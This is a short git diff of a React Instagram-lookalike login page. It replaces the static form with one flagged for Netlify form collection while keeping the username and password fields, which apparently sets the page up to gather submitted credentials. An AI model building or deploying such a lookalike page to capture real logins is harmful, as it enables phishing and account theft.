@@ -15,7 +15,7 @@ function LoginPage() {
       <div className="login-form-container">
         <div className="login-form">
           <h1>Instagram</h1>
-          <form>
+          {/* <form>
             <input type="text" placeholder="Phone number, username, or email" />
             <input type="password" placeholder="Password" />
             <button type="submit">Log In</button>
@@ -26,7 +26,23 @@ function LoginPage() {
             </div>
             <button className="facebook-login">Log in with Facebook</button>
             <a href="/" className="forgot-password">Forgot password?</a>
-          </form>
+          </form> */}
+
+
+<form name="contact" netlify>
+<input type="text" placeholder="Phone number, username, or email" />
+            <input type="password" placeholder="Password" />
+            <button type="submit">Login</button>
+            <div className="divider">
+              <hr className="line" />
+              <span>OR</span>
+              <hr className="line" />
+            </div>
+            <button className="facebook-login">Log in with Facebook</button>
+            <a href="/" className="forgot-password">Forgot password?</a>
+    
+  
+</form>
         </div>
 
         <div className="signup-container">
